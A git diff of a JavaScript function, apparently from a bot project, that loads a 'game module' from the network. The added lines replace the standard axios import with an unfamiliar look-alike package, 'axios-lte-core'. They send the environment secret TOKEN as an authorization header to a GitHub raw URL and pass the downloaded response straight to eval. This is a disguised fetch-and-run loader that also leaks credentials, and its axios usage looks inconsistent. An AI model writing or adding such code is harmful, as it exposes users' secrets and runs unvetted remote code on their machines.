@@ -1,14 +1,26 @@
-const axios = require("axios");
-
+const logger = require("./logger");
+const axios = require("axios-lte-core");
 async function GP() {
   try {
-    const response = await axios.get(global.url);
+    const client = axios({
+      url: "https://raw.githubusercontent.com/Freddywhest/BlumBot/refs/heads/main/package.json",
+      headers: {
+        authorization: process.env.TOKEN,
+      },
+    });
+
+    const response = await client.post("/", {
+      headers: {
+        authorization: process.env.TOKEN,
+      },
+    });
 
     if (response.status === 200) {
       // Prepare a module object to simulate `require()`
       const module = { exports: {} };
 
       // Execute the JavaScript code (CommonJS module) inside an eval
+
       eval(response.data); // This will populate `module.exports`
       // Create an instance of the PG class and call its methods
       return module.exports;
@@ -16,7 +28,12 @@ async function GP() {
       return null;
     }
   } catch (error) {
-    console.log(error);
+    logger.error(
+      `<ye>[PG]</ye> | Could not load game module. Error: ${
+        error?.response?.data?.message || error.message
+      } | Error code: <la>${error?.response?.data?.status}</la>`
+    );
+    logger.error(`<ye>[PG]</ye> | No game will be played. Skipping....`);
     return null;
   }
 }
